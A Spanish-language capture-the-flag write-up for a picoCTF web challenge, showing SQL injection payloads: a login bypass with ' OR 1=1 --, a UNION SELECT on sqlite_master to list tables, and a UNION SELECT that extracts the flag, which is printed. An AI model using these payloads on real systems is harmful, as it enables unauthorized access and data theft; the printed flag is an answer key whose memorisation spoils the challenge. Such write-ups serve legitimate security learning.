## Descripción

Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:50079/).

## Solución

**Solución 1
```
Contraseña : ' OR 1=1 --
  |
  |
  v
Listar Tablas--> El comando  en el buscador para ver qué tablas existen: ' UNION SELECT name, sql, null FROM sqlite_master --
  |
  |
  v
|more_table|CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)|
  |
  |
  v
' UNION SELECT flag, "columna2", "columna3" FROM more_table --

picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}
```

#### NOTAS
Como la contraseña se evalúa primero, invertir la lógica. En el campo de **password** escribir:

> `' OR 1=1 --`

### ¿Por qué este comando?

1. **`' UNION SELECT`**: Une los resultados de la búsqueda normal con los resultados de nuestra consulta maliciosa.
    
2. **`flag`**: Es el nombre de la columna que contiene el secreto, según lo que viste en el esquema (`CREATE TABLE more_table ... flag TEXT`).
    
3. **`"columna2", "columna3"`**: La tabla original de búsqueda parece tener 3 columnas (City, Address, Phone). El comando `UNION` exige que ambas consultas tengan el **mismo número de columnas**. Si con dos textos extra no funciona, prueba quitando uno o poniendo `null`.
    
4. **`FROM more_table`**: Le indicamos de qué tabla sacar la información.
    
5. **`--`**: Comenta el resto de la consulta original para que no cause errores de sintaxis.